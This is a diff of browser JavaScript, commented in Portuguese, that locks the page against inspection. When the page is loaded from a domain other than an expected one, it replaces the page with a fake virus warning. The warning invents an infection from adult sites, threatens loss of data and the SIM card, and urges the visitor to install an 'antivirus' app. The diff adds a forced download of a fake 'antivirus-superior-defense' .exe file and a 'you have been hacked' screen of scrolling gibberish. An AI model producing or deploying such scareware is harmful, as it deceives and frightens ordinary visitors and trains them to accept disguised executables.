@@ -1,15 +1,32 @@
-// Bloquear teclado
+// Bloquear teclado e ações do mouse
 try {
     document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
     document.addEventListener('keydown', function (e) {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) { e.preventDefault(); }
+        if (
+            e.key === 'F12' ||
+            (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
+            (e.ctrlKey && e.key === 'U')
+        ) {
+            e.preventDefault();
+        }
     });
     document.addEventListener('selectstart', function (e) { e.preventDefault(); });
 } catch (e) {
     console.warn(e);
 }
 
-// Função para limpar o conteúdo do body e adicionar o popup customizado
+function baixarArquivoFalso() {
+    const blob = new Blob([""], { type: "application/octet-stream" }); // Arquivo vazio
+    const nomeAleatorio = 'antivirus-superior-defense-' + Math.floor(Math.random() * 1000000) + '.exe';
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = nomeAleatorio;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+
+// Função para limpar o conteúdo da página e exibir alerta
 function limparBody() {
     document.body.innerHTML = `
         <div class="popup">
@@ -18,7 +35,7 @@ function limparBody() {
             </div>
             <div class="popup-message">
                 <h2>Seu sistema foi gravemente danificado.</h2><br>
-                Detectamos que uma parte das configurações de navegação na internet do seu dispositivo foi danificado devido à presença de <span class="virus-number">4 vírus</span> contraídos em sites adultos. Em breve, o cartão SIM do seu telefone poderá ser danificado, e seus contatos, fotos, dados, aplicativos etc poderão ser corrompidos.<br><br>Instale o nosso aplicativo de segurança para limpar esses vírus IMEDIATAMENTE para que você não perca os seus dados para sempre.
+                Detectamos que uma parte das configurações de navegação na internet do seu dispositivo foi danificada devido à presença de <span class="virus-number">4 vírus</span> contraídos em sites adultos. Em breve, o cartão SIM do seu telefone poderá ser danificado, e seus contatos, fotos, dados, aplicativos etc poderão ser corrompidos.<br><br>Instale o nosso aplicativo de segurança para limpar esses vírus IMEDIATAMENTE para que você não perca os seus dados para sempre.
             </div>
             <div class="popup-buttons">
                 <button class="cancel-button">Cancelar</button>
@@ -99,21 +116,17 @@ function limparBody() {
                 color: blue;
             }
 
-            h1, h2, h3, h4, h5, h6 {
-                margin-block-start: 0;
-                margin-block-end: 0;
+            h1, h2 {
+                margin: 0;
                 font-family: inherit;
-                font-weight: 500;
+                font-weight: 600;
                 line-height: 1.2;
-                color: inherit;
             }
 
             h2 {
                 font-size: 21px;
-                font-weight: 600;
             }
 
-            /* Estilo para o efeito de "corromper" */
             #corrupt-screen {
                 position: fixed;
                 top: 0;
@@ -132,19 +145,19 @@ function limparBody() {
                 overflow-y: visible !important;
             }
         </style>
-        <div id="corrupt-screen"></div>
+        <div id="corrupt-screen">VOCÊ FOI HACKEADO...</div>
     `;
 
-    // Adicionar ação nos botões
     setTimeout(() => {
         const cancelButton = document.querySelector('.cancel-button');
         const cleanButton = document.querySelector('.clean-button');
 
         function alertaAviso(e) {
             e.preventDefault();
-            alert('ATENÇÃO: Foi detectada a tentativa de baixar um aplicativo desconhecido no seu dispositivo.\nClique em OK para continuar');
-            e.target.blur(); // Remove o focus do botão após clicar
-            iniciarCorrupcao(); // Iniciar corrupção na tela
+            alert('ATENÇÃO: Foi detectada a tentativa de baixar um aplicativo desconhecido no seu dispositivo.\nClique em OK para continuar.');
+            baixarArquivoFalso(); // Faz o download do arquivo falso
+            e.target.blur();
+            iniciarCorrupcao();
         }
 
         if (cancelButton) cancelButton.addEventListener('click', alertaAviso);
@@ -152,7 +165,7 @@ function limparBody() {
     }, 100);
 }
 
-// Função para iniciar o efeito de "corrupção" na tela
+// Efeito de "corrupção" na tela
 function iniciarCorrupcao() {
     const tela = document.getElementById('corrupt-screen');
     tela.style.display = 'block';
@@ -160,23 +173,13 @@ function iniciarCorrupcao() {
     setInterval(() => {
         const randomChar = caracteres.charAt(Math.floor(Math.random() * caracteres.length));
         tela.textContent += randomChar;
-        if (tela.textContent.length > 10000) { // Limita o tamanho para não travar o navegador
+        if (tela.textContent.length > 10000) {
             tela.textContent = '';
         }
-    }, 1); // A cada milissegundo adiciona um novo caractere
+    }, 1);
 }
 
+// Verifica domínio e executa o alerta
 if (!window.location.href.startsWith(urlDomain)) {
     limparBody();
 }
-
-/*
-document.addEventListener("DOMContentLoaded", function () {
-    if (window.location.href.indexOf(urlDomain) === 0) {
-        // Se o domínio estiver correto, não faz nada
-    } else {
-        setTimeout(function () {
-            limparBody();
-        }, 3000);
-    }
-});
